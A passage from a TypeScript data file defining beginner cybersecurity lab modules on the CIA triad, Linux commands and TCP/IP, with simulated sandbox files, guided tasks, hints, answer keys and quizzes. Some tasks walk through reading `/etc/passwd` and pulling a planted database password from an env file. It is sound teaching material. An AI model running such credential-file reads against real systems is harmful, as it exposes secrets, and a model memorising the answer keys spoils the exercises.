import { CyberLabModule } from '../types/cyberLabModuleTypes';

export const CYBER_LAB_MODULES: CyberLabModule[] = [
  // ==========================================
  // MODULE 1: INTRODUCTION TO CYBER SECURITY
  // ==========================================
  {
    id: 'module-01-intro-cyber',
    code: 'LAB-01',
    slug: 'intro-cyber-security',
    title: 'Cybersecurity Foundations & The CIA Triad',
    badge: 'FOUNDATIONS',
    category: 'Foundations',
    difficulty: 'Beginner',
    estimatedMinutes: 25,
    xpReward: 350,
    skillsEarned: ['Security Principles', 'CIA Triad', 'Threat Modeling', 'Rules of Engagement'],
    prerequisites: ['None (Zero-Knowledge Friendly)'],
    roleAlignment: ['SOC Analyst', 'Cybersecurity Analyst', 'Security Engineer'],
    summary: 'Master the foundational architecture of digital security: the CIA Triad, threat actor motivations, vulnerabilities vs risks, and ethical rules of engagement.',
    learningObjectives: [
      'Define Confidentiality, Integrity, and Availability with real-world scenarios',
      'Distinguish between vulnerabilities, threats, threat actors, and overall risk',
      'Understand ethical hacking authorization, rules of engagement, and legal boundaries',
      'Identify defensive security controls and least-privilege principles'
    ],
    overview: {
      introduction: 'Cybersecurity is not just about tools and scripts—it is a discipline of defending digital systems, preserving human privacy, and maintaining system resilience against malicious adversaries.',
      whyItMatters: 'Every enterprise breach occurs because one or more pillars of the CIA Triad was compromised. Understanding these core models lets you design robust defenses and systematically evaluate weaknesses.',
      realWorldApplication: 'Security analysts use the CIA Triad daily to classify security alerts, assess breach severity, and prioritize remediation efforts according to business impact.'
    },
    theorySections: [
      {
        id: 'sec-cia',
        title: 'The CIA Triad: The Cornerstone of Information Security',
        subtitle: 'Confidentiality, Integrity, and Availability',
        content: `The CIA Triad is the universally accepted model for designing and evaluating secure systems:

1. **Confidentiality**: Ensuring data is accessible ONLY to authorized individuals.
   • *Attacks*: Eavesdropping, unauthorized database dumps, credential theft.
   • *Controls*: AES encryption, multi-factor authentication (MFA), role-based access control (RBAC).

2. **Integrity**: Guaranteeing data is accurate, complete, and protected against unauthorized modification.
   • *Attacks*: Man-in-the-middle packet tampering, unauthorized log tampering, file modification.
   • *Controls*: Cryptographic hashes (SHA-256), digital signatures, append-only audit logging.

3. **Availability**: Ensuring authorized users have reliable, timely access to services and data.
   • *Attacks*: Distributed Denial of Service (DDoS), ransomware locking critical file systems, hardware failure.
   • *Controls*: High availability clusters, load balancing, off-site immutable backups, redundant network links.`,
        diagramType: 'osi_model',
        keyTakeaways: [
          'Confidentiality protects secrets via encryption and access controls.',
          'Integrity prevents unauthorized tampering via cryptographic hashes.',
          'Availability ensures continuous uptime against DDoS and outages.'
        ]
      },
      {
        id: 'sec-threat-vuln',
        title: 'Vulnerability vs Threat vs Risk',
        subtitle: 'The Risk Equation in Action',
        content: `In professional cybersecurity, precision terminology is crucial:

• **Vulnerability**: A flaw or weakness in software design, configuration, or human protocol (e.g., an unpatched web server with an outdated OpenSSL library).
• **Threat**: An event or actor with the capability and intent to exploit a vulnerability (e.g., a ransomware gang targeting unpatched servers).
• **Threat Actor**: The human or group behind the threat (e.g., nation-state APTs, cybercriminals, script kiddies, malicious insiders).
• **Risk**: The likelihood of a threat exploiting a vulnerability multiplied by the resulting business impact.
  **Risk = Threat × Vulnerability × Impact**`,
        codeSnippet: {
          language: 'markdown',
          title: 'Risk Equation Assessment Matrix',
          code: `[High Impact (Financial Loss)] + [High Vulnerability (No Patch)] = CRITICAL RISK (Immediate Remediation)
[Low Impact (Test Environment)] + [Low Threat (Air-gapped)]     = LOW RISK (Scheduled Maintenance)`
        },
        keyTakeaways: [
          'A vulnerability without an active threat represents lower immediate risk than an actively exploited 0-day.',
          'Remediation focuses on eliminating vulnerabilities or reducing business impact.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'academy-foundations-node',
      targetIp: '10.10.10.5',
      targetOs: 'Ubuntu Linux 22.04 LTS (Sandbox)',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        '[BOOT] System initialized in isolated educational sandbox.',
        '[NOTICE] Connected to target 10.10.10.5 (academy-foundations-node).',
        '[INFO] Type "help" or run diagnostic commands to explore.'
      ],
      simulatedFileSystem: {
        '/home/operator/briefing.txt': 'Welcome Operator! This terminal is an authorized training sandbox.\nTarget: 10.10.10.5\nStatus: Secure',
        '/etc/security_policy.conf': 'POLICY_NAME="LEAST_PRIVILEGE_POLICY"\nDEFAULT_RULE="DENY_ALL"\nAUDIT_LOGGING="ENABLED"\nHASH_ALGO="SHA256"',
        '/var/log/audit.log': '2026-08-23 00:15:22 [ALERT] Unauthorized file modification detected in /var/www/html (Integrity Check Failed)'
      },
      simulatedServices: [
        { port: 22, service: 'SSH', banner: 'OpenSSH 8.9p1 Ubuntu', state: 'open' },
        { port: 80, service: 'HTTP', banner: 'Apache/2.4.52 (Ubuntu)', state: 'open' }
      ]
    },
    tasks: [
      {
        id: 't01-1',
        taskNumber: 1,
        title: 'Identify the CIA Triad Pillar for Encryption',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'An enterprise encrypts employee payroll files on a local file server so unauthorized staff cannot read the salary records.',
        instructions: 'Select which core pillar of the CIA Triad this security control is enforcing.',
        questionType: 'multiple_choice',
        multipleChoiceOptions: ['Availability', 'Confidentiality', 'Integrity', 'Non-repudiation'],
        correctOptionIndex: 1,
        hint1_concept: 'Think about whether the control is keeping data secret, preventing tampering, or ensuring uptime.',
        hint2_direction: 'The scenario mentions keeping salary records from being READ by unauthorized staff.',
        hint3_specific: 'Preventing unauthorized reading is the definition of Confidentiality.',
        finalExplanation: 'Confidentiality ensures that information is accessible only to those authorized to have access. Encryption renders readable plaintext into ciphertext.',
        xpReward: 50,
        skillTested: 'CIA Triad Fundamentals'
      },
      {
        id: 't01-2',
        taskNumber: 2,
        title: 'Inspect the Sandbox Security Policy File',
        type: 'terminal',
        difficulty: 'Beginner',
        description: 'Read the contents of the security policy file located at /etc/security_policy.conf in the provided educational sandbox.',
        instructions: 'Run `cat /etc/security_policy.conf` in the terminal and enter the value of the HASH_ALGO setting.',
        educationalCommandSuggestion: 'cat /etc/security_policy.conf',
        questionType: 'text_exact',
        expectedAnswers: ['SHA256', '"SHA256"', 'sha256'],
        placeholder: 'e.g. SHA256 or MD5',
        hint1_concept: 'Use the standard Linux file viewing command "cat" followed by the path.',
        hint2_direction: 'Type `cat /etc/security_policy.conf` in the right-side sandbox terminal.',
        hint3_specific: 'Look at the line `HASH_ALGO="SHA256"` in the output.',
        finalExplanation: 'SHA-256 is a modern cryptographic hash algorithm used to verify data integrity and prevent tampering.',
        xpReward: 75,
        skillTested: 'Linux Terminal & Integrity'
      },
      {
        id: 't01-3',
        taskNumber: 3,
        title: 'Identify Attack Impact on Availability',
        type: 'identification',
        difficulty: 'Beginner',
        description: 'A malicious botnet floods a hospital emergency web server with 500 Gigabits per second of junk traffic, causing the web server to crash and refuse legitimate ambulance requests.',
        instructions: 'Which component of the CIA Triad has been directly breached in this scenario?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: ['Integrity', 'Confidentiality', 'Availability', 'Authentication'],
        correctOptionIndex: 2,
        hint1_concept: 'The system crashed and legitimate users can no longer access or reach the service.',
        hint2_direction: 'Denial of Service (DoS/DDoS) targets system uptime and accessibility.',
        hint3_specific: 'Denial of Service directly attacks Availability.',
        finalExplanation: 'Availability ensures timely and reliable access to systems. Denial of Service attacks directly violate Availability by overwhelming resources.',
        xpReward: 75,
        skillTested: 'Threat Analysis'
      },
      {
        id: 't01-4',
        taskNumber: 4,
        title: 'Audit Log Integrity Investigation',
        type: 'investigation',
        difficulty: 'Easy',
        description: 'Inspect `/var/log/audit.log` in the sandbox to identify what type of security check failed.',
        instructions: 'Run `cat /var/log/audit.log` in the terminal and identify the security check mentioned in brackets.',
        educationalCommandSuggestion: 'cat /var/log/audit.log',
        questionType: 'text_exact',
        expectedAnswers: ['Integrity Check Failed', 'Integrity Check', 'Integrity', 'integrity check failed'],
        placeholder: 'e.g. Integrity Check Failed',
        hint1_concept: 'Inspect the last log entry in `/var/log/audit.log`.',
        hint2_direction: 'Look inside the parentheses at the end of the log message.',
        hint3_specific: 'The log records: `(Integrity Check Failed)`.',
        finalExplanation: 'When file modification occurs without authorization, file integrity monitoring (FIM) systems log an Integrity Check Failure.',
        xpReward: 100,
        skillTested: 'Log Analysis'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-01',
      title: 'Module 1 Assessment: Security Fundamentals',
      questions: [
        {
          id: 'q01-1',
          prompt: 'What is the primary difference between a vulnerability and a threat?',
          options: [
            'A vulnerability is an external attacker, while a threat is a software patch',
            'A vulnerability is an internal weakness/flaw, while a threat is an external force or actor capable of exploiting it',
            'Vulnerabilities only exist on Linux, while threats only exist on Windows',
            'There is no difference; they are interchangeable terms'
          ],
          correctIndex: 1,
          explanation: 'A vulnerability is a flaw or weakness in a system; a threat is an entity or event with the potential to exploit that flaw.'
        },
        {
          id: 'q01-2',
          prompt: 'Which security principle mandates that a user or process should only be granted the minimum permissions necessary to complete their job?',
          options: [
            'Defense in Depth',
            'Principle of Least Privilege',
            'Zero Day Vulnerability',
            'Security through Obscurity'
          ],
          correctIndex: 1,
          explanation: 'The Principle of Least Privilege dictates that accounts and processes have only the bare minimum rights required to perform their authorized functions.'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 2: LINUX FUNDAMENTALS & CLI
  // ==========================================
  {
    id: 'module-02-linux-cli-mastery',
    code: 'LAB-02',
    slug: 'linux-cli-mastery',
    title: 'Linux Command Line & File Operations',
    badge: 'LINUX',
    category: 'Linux',
    difficulty: 'Beginner',
    estimatedMinutes: 30,
    xpReward: 400,
    skillsEarned: ['Linux Shell', 'File Navigation', 'Permissions (chmod/chown)', 'Grep & Search', 'Process Triage'],
    prerequisites: ['module-01-intro-cyber'],
    roleAlignment: ['Penetration Tester', 'SOC Analyst', 'Security Engineer', 'DevSecOps'],
    summary: 'Master the Linux command line: navigate directories, inspect hidden files, manipulate permissions with chmod, search text with grep, and audit running processes.',
    learningObjectives: [
      'Navigate the Linux hierarchical filesystem using pwd, ls -la, and cd',
      'Read, create, and search files using cat, head, tail, and grep',
      'Understand Unix file permission octals (rwx: 4, 2, 1) and modify permissions with chmod',
      'Inspect system processes and find active daemons with ps aux'
    ],
    overview: {
      introduction: 'Over 90% of cloud servers, security tools, and cyber defense environments run on Linux. Mastering the terminal is the single most important skill for any cybersecurity professional.',
      whyItMatters: 'Security analysts and ethical hackers do not use graphical user interfaces. Everything from server triage, log auditing, memory analysis, and reverse engineering happens in the shell.',
      realWorldApplication: 'When investigating a breached server, analysts use bash commands like `find / -perm -4000`, `grep`, and `ps aux` to locate backdoor binaries, persistence mechanisms, and compromised credentials.'
    },
    theorySections: [
      {
        id: 'sec-linux-fs',
        title: 'The Unix Filesystem Hierarchy: Everything is a File',
        subtitle: 'Root, Binaries, Configs, and Logs',
        content: `In Linux, all data, devices, sockets, and hardware are represented as files starting from the single root directory \`/\`:

• \`/bin\` & \`/usr/bin\`: Essential executable binary programs (\`ls\`, \`cat\`, \`grep\`, \`nmap\`).
• \`/etc\`: System configuration files (\`/etc/passwd\`, \`/etc/shadow\`, \`/etc/network/interfaces\`).
• \`/home\`: User home directories where personal documents and keys reside.
• \`/var/log\`: System and application logs (\`/var/log/auth.log\`, \`/var/log/syslog\`, \`/var/log/nginx/\`).
• \`/tmp\`: Temporary world-writable workspace frequently used by attackers for payload staging.
• \`/proc\`: Virtual filesystem exposing kernel memory and active processes.`,
        diagramType: 'linux_tree',
        keyTakeaways: [
          'The Linux tree begins at `/` (root), not drive letters like C:\\.',
          '`/etc` houses system configurations; `/var/log` houses operational logs.'
        ]
      },
      {
        id: 'sec-permissions',
        title: 'Linux Permissions & Octal Math',
        subtitle: 'Read (4), Write (2), and Execute (1)',
        content: `Every file and directory in Linux has three permission tiers:
1. **User (Owner)**
2. **Group**
3. **Others (World)**

Each tier is composed of three permission bits:
• **r (Read)** = 4
• **w (Write)** = 2
• **x (Execute)** = 1

Examples:
• \`chmod 755 script.sh\` -> Owner: 4+2+1=7 (rwx), Group: 4+0+1=5 (r-x), Others: 4+0+1=5 (r-x)
• \`chmod 600 id_rsa\` -> Owner: 4+2+0=6 (rw-), Group: 0 (---), Others: 0 (---) [Private SSH Key standard]
• \`chmod 777 bad.txt\` -> Everyone has full read, write, and execute permissions (Severe Security Risk!)`,
        codeSnippet: {
          language: 'bash',
          title: 'Permission Representation',
          code: `-rwxr-xr-- 1 operator secops 4096 Aug 23 00:00 deploy.sh
│├─┘├─┘├─┘
│ │   │   └── Others: Read only (4)
│ │   └────── Group (secops): Read + Execute (4+1 = 5)
│ └────────── Owner (operator): Read + Write + Execute (4+2+1 = 7)
└──────────── File Type: '-' for regular file, 'd' for directory`
        },
        keyTakeaways: [
          'SSH private keys must strictly use `chmod 600` or `chmod 400`.',
          'Never leave sensitive scripts with world-writable `777` permissions.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'cyberlab-linux-target',
      targetIp: '10.10.14.12',
      targetOs: 'Debian GNU/Linux 12 (Bookworm)',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        'Debian GNU/Linux 12 cyberlab-linux-target tty1',
        'operator@cyberlab-linux-target:~$ pwd',
        '/home/operator'
      ],
      simulatedFileSystem: {
        '/home/operator/.hidden_flag.txt': 'FLAG{linux_hidden_files_revealed}',
        '/home/operator/notes.txt': 'Remember to rotate the admin API token in /opt/api/keys.env next Monday.',
        '/opt/api/keys.env': 'DATABASE_URL="postgres://admin:Sup3rS3cr3tPass!@10.10.14.50:5432/production"\nAPI_KEY="sk_live_9988223311"',
        '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\noperator:x:1000:1000:Operator,,,:/home/operator:/bin/bash\nservice_backup:x:1001:1001:Backup Service:/var/backups:/bin/sh',
        '/var/log/syslog': 'Aug 23 00:01:12 host systemd[1]: Started Web Application Daemon.\nAug 23 00:05:43 host sshd[1294]: Accepted password for operator from 10.10.14.2 port 49812 ssh2'
      },
      simulatedServices: [
        { port: 22, service: 'SSH', banner: 'OpenSSH 9.2p1 Debian', state: 'open' },
        { port: 5432, service: 'PostgreSQL', banner: 'PostgreSQL 15.3 Database', state: 'listening' }
      ]
    },
    tasks: [
      {
        id: 't02-1',
        taskNumber: 1,
        title: 'Reveal Hidden Files in User Home Directory',
        type: 'terminal',
        difficulty: 'Beginner',
        description: 'In Linux, files starting with a period (.) are hidden from standard `ls` directory listings.',
        instructions: 'Run `ls -la` in the terminal to view all hidden files, then use `cat` to read the hidden flag file.',
        educationalCommandSuggestion: 'ls -la && cat .hidden_flag.txt',
        questionType: 'text_exact',
        expectedAnswers: ['FLAG{linux_hidden_files_revealed}', 'flag{linux_hidden_files_revealed}'],
        placeholder: 'FLAG{...}',
        hint1_concept: 'The `-a` flag instructs `ls` to show all files including hidden ones starting with a dot.',
        hint2_direction: 'Type `ls -la` in the sandbox terminal. Look for `.hidden_flag.txt`.',
        hint3_specific: 'Run `cat .hidden_flag.txt` to display the flag.',
        finalExplanation: 'Attackers frequently hide configuration files or backdoors using dotfile prefixes (e.g. `.ssh`, `.env`, `.backdoor`). Using `ls -la` ensures full visibility.',
        xpReward: 75,
        skillTested: 'Linux Directory Enumeration'
      },
      {
        id: 't02-2',
        taskNumber: 2,
        title: 'Extract Database Password using Grep',
        type: 'terminal',
        difficulty: 'Easy',
        description: 'A developer stored database credentials in `/opt/api/keys.env`.',
        instructions: 'Use `cat /opt/api/keys.env` or `grep` to extract the database password from the `DATABASE_URL` string.',
        educationalCommandSuggestion: 'cat /opt/api/keys.env',
        questionType: 'text_exact',
        expectedAnswers: ['Sup3rS3cr3tPass!', 'Sup3rS3cr3tPass', 'sup3rs3cr3tpass!'],
        placeholder: 'e.g. Sup3rS3cr3tPass!',
        hint1_concept: 'The URL format is postgres://username:password@host:port/database.',
        hint2_direction: 'Inspect the line `DATABASE_URL="postgres://admin:Sup3rS3cr3tPass!@...`.',
        hint3_specific: 'The password situated between `admin:` and `@10.10.14.50` is `Sup3rS3cr3tPass!`.',
        finalExplanation: 'Hardcoded credentials in environment files or source code repositories are among the leading causes of enterprise cloud account compromises.',
        xpReward: 100,
        skillTested: 'Credential Harvesting & Grep'
      },
      {
        id: 't02-3',
        taskNumber: 3,
        title: 'Calculate Octal Permissions for Private Keys',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'You need to set permissions on an SSH private key `id_rsa` so only the owner can Read and Write, while Group and Others have Zero permissions.',
        instructions: 'What numeric 3-digit chmod command argument represents this permission structure?',
        questionType: 'text_exact',
        expectedAnswers: ['600', 'chmod 600', 'chmod 600 id_rsa'],
        placeholder: 'e.g. 600 or 755',
        hint1_concept: 'Read = 4, Write = 2, Execute = 1. Add them up for Owner, Group, and Others.',
        hint2_direction: 'Owner needs Read (4) + Write (2) = 6. Group gets 0. Others get 0.',
        hint3_specific: 'The octal value is 600.',
        finalExplanation: '`chmod 600` ensures private cryptographic keys cannot be read by any other standard user account on the multi-user system.',
        xpReward: 75,
        skillTested: 'Linux Permissions'
      },
      {
        id: 't02-4',
        taskNumber: 4,
        title: 'Enumerate System Users in /etc/passwd',
        type: 'investigation',
        difficulty: 'Easy',
        description: 'Inspect `/etc/passwd` to identify the username of the dedicated backup service account on the system.',
        instructions: 'Run `cat /etc/passwd` and identify the user account dedicated to backups.',
        educationalCommandSuggestion: 'cat /etc/passwd | grep backup',
        questionType: 'text_exact',
        expectedAnswers: ['service_backup', 'service_backup:x:1001:1001:Backup Service:/var/backups:/bin/sh'],
        placeholder: 'e.g. service_backup',
        hint1_concept: 'The `/etc/passwd` file contains one line per system user.',
        hint2_direction: 'Look at the last line of `/etc/passwd`.',
        hint3_specific: 'The username is `service_backup`.',
        finalExplanation: 'The `/etc/passwd` file is world-readable and details all local usernames, UIDs, GIDs, home directories, and default login shells.',
        xpReward: 100,
        skillTested: 'Linux System Enumeration'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-02',
      title: 'Module 2 Assessment: Linux Shell & Permissions',
      questions: [
        {
          id: 'q02-1',
          prompt: 'Which Linux command is used to display the current working directory path?',
          options: ['dir', 'cd .', 'pwd', 'whereami'],
          correctIndex: 2,
          explanation: '`pwd` stands for "Print Working Directory" and outputs the absolute path of the current directory.'
        },
        {
          id: 'q02-2',
          prompt: 'What permission string is represented by the octal number 755?',
          options: [
            'rwxr-xr-x',
            'rw-r--r--',
            'rwxrwxrwx',
            'r-xr-xr-x'
          ],
          correctIndex: 0,
          explanation: '7 = rwx (4+2+1), 5 = r-x (4+0+1), 5 = r-x (4+0+1).'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 3: NETWORKING, IP & PORTS
  // ==========================================
  {
    id: 'module-03-networking-ip-ports',
    code: 'LAB-03',
    slug: 'networking-ip-ports',
    title: 'TCP/IP, Addressing & Port Architecture',
    badge: 'NETWORKING',
    category: 'Networking',
    difficulty: 'Beginner',
    estimatedMinutes: 35,
    xpReward: 450,
    skillsEarned: ['OSI 7 Layers', 'IPv4 Addressing', 'Subnetting Math', 'TCP 3-Way Handshake', 'Port Analysis'],
    prerequisites: ['module-01-intro-cyber'],
    roleAlignment: ['SOC Analyst', 'Network Security Engineer', 'Penetration Tester', 'Cloud Architect'],
    summary: 'Understand the mechanics of digital transmission: OSI model layers, IPv4 header anatomy, private vs public subnets (RFC 1918), TCP vs UDP, and the TCP 3-way handshake.',
    learningObjectives: [
      'Map protocols (IP, TCP, UDP, HTTP, DNS, ARP) to the correct OSI and TCP/IP layers',
      'Calculate network IDs, broadcast addresses, and usable host ranges for /24 and /28 subnets',
      'Understand the TCP 3-way handshake (SYN, SYN-ACK, ACK) and connection teardown',
      'Identify well-known ports (21, 22, 25, 53, 80, 443, 3389, 8080)'
    ],
    overview: {
      introduction: 'Every cyber attack and defense operation moves across a network. If you do not understand packets, IP routing, and port sockets, you cannot defend an infrastructure or spot advanced intrusions.',
      whyItMatters: 'Network firewalls, intrusion detection systems (IDS), and Wireshark captures all operate on packet headers. Recognizing anomalies in packet flows is how modern SOC analysts detect active malware beacons.',
      realWorldApplication: 'Security engineers configure Access Control Lists (ACLs) and inspect firewall flow logs to ensure database subnets cannot communicate directly with the public Internet.'
    },
    theorySections: [
      {
        id: 'sec-osi-model',
        title: 'The OSI 7-Layer Model vs TCP/IP Protocol Stack',
        subtitle: 'How Data Travels Across the Wire',
        content: `Data travels from physical electrical pulses up to application software through 7 logical layers:

• **Layer 7: Application**: HTTP, HTTPS, DNS, SSH, FTP, SMTP.
• **Layer 6: Presentation**: Data formatting, compression, TLS/SSL encryption.
• **Layer 5: Session**: Managing ongoing communication sessions.
• **Layer 4: Transport**: TCP (reliable, connection-oriented) vs UDP (fast, connectionless). Port numbers reside here!
• **Layer 3: Network**: IP addresses (IPv4/IPv6), ICMP (ping), routing across networks.
• **Layer 2: Data Link**: MAC addresses, switches, ARP (translates IP to MAC), Ethernet frames.
• **Layer 1: Physical**: Cables, fiber optics, radio waves, electrical signals.`,
        diagramType: 'osi_model',
        keyTakeaways: [
          'IP addresses exist at Layer 3 (Network); Port numbers exist at Layer 4 (Transport).',
          'Switches forward frames via MAC addresses (Layer 2); Routers route packets via IP addresses (Layer 3).'
        ]
      },
      {
        id: 'sec-tcp-handshake',
        title: 'The TCP 3-Way Handshake (SYN, SYN-ACK, ACK)',
        subtitle: 'Establishing Reliable Connections',
        content: `Before transmitting any application data over TCP (like loading a web page), client and server synchronize sequence numbers:

1. **SYN (Synchronize)**: Client sends packet with SYN flag set and initial sequence number (ISN_Client).
2. **SYN-ACK (Synchronize-Acknowledge)**: Server acknowledges receipt (ACK = ISN_Client + 1) and sends its own ISN_Server.
3. **ACK (Acknowledge)**: Client acknowledges the server sequence number (ACK = ISN_Server + 1).

Connection is now **ESTABLISHED**! Application data begins transferring.`,
        diagramType: 'tcp_handshake',
        codeSnippet: {
          language: 'markdown',
          title: 'TCP Handshake Sequence',
          code: `Client (192.168.1.100:52410) ---- [SYN seq=1000] ----> Server (192.168.1.1:80)
Client (192.168.1.100:52410) <--- [SYN-ACK seq=4000 ack=1001] --- Server (192.168.1.1:80)
Client (192.168.1.100:52410) ---- [ACK seq=1001 ack=4001] ----> Server (192.168.1.1:80)`
        },
        keyTakeaways: [
          'TCP guarantees ordered, error-checked packet delivery.',
          'Nmap SYN stealth scans (`-sS`) send only the initial SYN and teardown with RST to avoid completing a full connection.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'academy-network-router',
      targetIp: '192.168.1.1',
      targetOs: 'Alpine Linux Networking Router',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        'Routing daemon initialized on eth0 (192.168.1.1/24) and eth1 (10.0.5.1/24)',
        'Packet capture engine listening on interface eth0.'
      ],
      simulatedFileSystem: {
        '/etc/network/interfaces': 'auto eth0\niface eth0 inet static\n  address 192.168.1.1\n  netmask 255.255.255.0\n  gateway 192.168.1.254\n\nauto eth1\niface eth1 inet static\n  address 10.0.5.1\n  netmask 255.255.255.240',
        '/var/log/dnsmasq.log': 'Aug 23 00:02:11 dnsmasq[412]: query[A] internal-corp.local from 192.168.1.105\nAug 23 00:02:11 dnsmasq[412]: reply internal-corp.local is 10.0.5.45'
      },
      simulatedServices: [
        { port: 53, service: 'DNS', banner: 'dnsmasq-2.89', state: 'open' },
        { port: 80, service: 'HTTP', banner: 'Lighttpd/1.4.69', state: 'open' },
        { port: 443, service: 'HTTPS', banner: 'Lighttpd/1.4.69 SSL', state: 'open' }
      ],
      simulatedNetworkPackets: [
        { id: 'pkt-1', no: 1, time: '0.000000', source: '192.168.1.105', destination: '192.168.1.1', protocol: 'TCP', length: 66, flags: 'SYN', info: '54120 -> 80 [SYN] Seq=0 Win=64240 Len=0', details: 'Transmission Control Protocol, Src Port: 54120, Dst Port: 80, Flags: 0x002 (SYN)' },
        { id: 'pkt-2', no: 2, time: '0.001420', source: '192.168.1.1', destination: '192.168.1.105', protocol: 'TCP', length: 66, flags: 'SYN-ACK', info: '80 -> 54120 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0', details: 'Transmission Control Protocol, Src Port: 80, Dst Port: 54120, Flags: 0x012 (SYN, ACK)' },
        { id: 'pkt-3', no: 3, time: '0.001580', source: '192.168.1.105', destination: '192.168.1.1', protocol: 'TCP', length: 54, flags: 'ACK', info: '54120 -> 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0', details: 'Transmission Control Protocol, Src Port: 54120, Dst Port: 80, Flags: 0x010 (ACK)' },
        { id: 'pkt-4', no: 4, time: '0.002100', source: '192.168.1.105', destination: '192.168.1.1', protocol: 'HTTP', length: 142, info: 'GET /index.html HTTP/1.1', details: 'Hypertext Transfer Protocol, GET /index.html HTTP/1.1\\r\\nHost: 192.168.1.1\\r\\n' }
      ]
    },
    tasks: [
      {
        id: 't03-1',
        taskNumber: 1,
        title: 'Identify the Layer 4 Protocol for DNS Queries',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'Standard domain name system (DNS) lookups for hostnames are lightweight, fast, and stateless.',
        instructions: 'Which transport layer protocol is primarily used for standard client DNS queries on port 53?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: ['TCP', 'UDP', 'ICMP', 'IGMP'],
        correctOptionIndex: 1,
        hint1_concept: 'Think about whether DNS needs the overhead of establishing a 3-way connection for a single query.',
        hint2_direction: 'DNS uses User Datagram Protocol because single-packet requests are faster with minimal overhead.',
        hint3_specific: 'Select UDP.',
        finalExplanation: 'DNS uses UDP port 53 for standard name queries because it is fast and low-latency. TCP port 53 is used for large zone transfers and responses exceeding 512 bytes.',
        xpReward: 50,
        skillTested: 'Transport Layer Protocols'
      },
      {
        id: 't03-2',
        taskNumber: 2,
        title: 'Calculate Usable Hosts in a /28 Subnet',
        type: 'knowledge',
        difficulty: 'Easy',
        description: 'Interface eth1 on the router is configured with subnet mask 255.255.255.240 (CIDR prefix /28).',
        instructions: 'How many usable host IP addresses are available in any standard /28 subnet?',
        questionType: 'text_exact',
        expectedAnswers: ['14', '14 hosts', '14 usable hosts'],
        placeholder: 'e.g. 14 or 30',
        hint1_concept: 'Calculate total host bits: 32 - 28 = 4 host bits. Total IPs = 2^4 = 16.',
        hint2_direction: 'Subtract 2 addresses for the Network ID and Broadcast address.',
        hint3_specific: '16 - 2 = 14 usable hosts.',
        finalExplanation: 'A /28 subnet provides 2^4 = 16 total IP addresses. Subtracting the Network ID (.0) and Broadcast (.15) leaves 14 assignable host addresses.',
        xpReward: 100,
        skillTested: 'Subnetting Calculations'
      },
      {
        id: 't03-3',
        taskNumber: 3,
        title: 'Analyze Wireshark Packet Capture Handshake',
        type: 'investigation',
        difficulty: 'Easy',
        description: 'Examine the simulated packet capture table in the right-side sandbox inspector.',
        instructions: 'What is the client source port number used in packet #1 for the TCP handshake request?',
        questionType: 'text_exact',
        expectedAnswers: ['54120', 'port 54120'],
        placeholder: 'e.g. 54120 or 80',
        hint1_concept: 'Inspect packet #1 in the simulated packet capture table.',
        hint2_direction: 'Look at the Info or Details column for the source port: `54120 -> 80 [SYN]`.',
        hint3_specific: 'The client source port is 54120.',
        finalExplanation: 'Operating systems dynamically allocate ephemeral source ports (typically 49152–65535) when initiating client connections to destination servers.',
        xpReward: 100,
        skillTested: 'Packet Analysis & Wireshark'
      },
      {
        id: 't03-4',
        taskNumber: 4,
        title: 'Extract Internal DNS Resolution Target',
        type: 'terminal',
        difficulty: 'Easy',
        description: 'Read the DNS resolver log at `/var/log/dnsmasq.log` to identify the resolved IP address for `internal-corp.local`.',
        instructions: 'Run `cat /var/log/dnsmasq.log` in the sandbox terminal and enter the IP address returned for `internal-corp.local`.',
        educationalCommandSuggestion: 'cat /var/log/dnsmasq.log',
        questionType: 'text_exact',
        expectedAnswers: ['10.0.5.45', '10.0.5.45/24'],
        placeholder: 'e.g. 10.0.5.45',
        hint1_concept: 'Inspect the last log entry in `/var/log/dnsmasq.log`.',
        hint2_direction: 'Look for `reply internal-corp.local is ...`.',
        hint3_specific: 'The IP address is 10.0.5.45.',
        finalExplanation: 'DNS server logs reveal internal hostname lookups, enabling security teams to trace rogue internal domains and C2 infrastructure communication.',
        xpReward: 100,
        skillTested: 'DNS Forensics'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-03',
      title: 'Module 3 Assessment: TCP/IP & Network Mechanics',
      questions: [
        {
          id: 'q03-1',
          prompt: 'What TCP flag combination is returned by a server to accept an incoming TCP connection?',
          options: ['SYN', 'ACK', 'SYN-ACK', 'FIN-ACK'],
          correctIndex: 2,
          explanation: 'The server responds to a client SYN with a SYN-ACK (Synchronize + Acknowledge).'
        },
        {
          id: 'q03-2',
          prompt: 'Which standard private IPv4 address range is defined by RFC 1918 for Class C networks?',
          options: [
            '10.0.0.0/8',
            '172.16.0.0/12',
            '192.168.0.0/16',
            '127.0.0.0/8'
          ],
          correctIndex: 2,
          explanation: '192.168.0.0 to 192.168.255.255 (/16) is the RFC 1918 Class C private address allocation.'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 4: WEB ARCHITECTURE & HTTP PROTOCOLS
  // ==========================================
  {
    id: 'module-04-dns-http-web',
    code: 'LAB-04',
    slug: 'dns-http-web-architecture',
    title: 'How The Web Works: DNS, HTTP & TLS',
    badge: 'WEB',
    category: 'Web Security',
    difficulty: 'Easy',
    estimatedMinutes: 30,
    xpReward: 400,
    skillsEarned: ['HTTP Methods', 'Headers & Status Codes', 'Cookies & Sessions', 'TLS Handshake', 'Web Security Headers'],
    prerequisites: ['module-03-networking-ip-ports'],
    roleAlignment: ['Web Security Specialist', 'Penetration Tester', 'Security Engineer'],
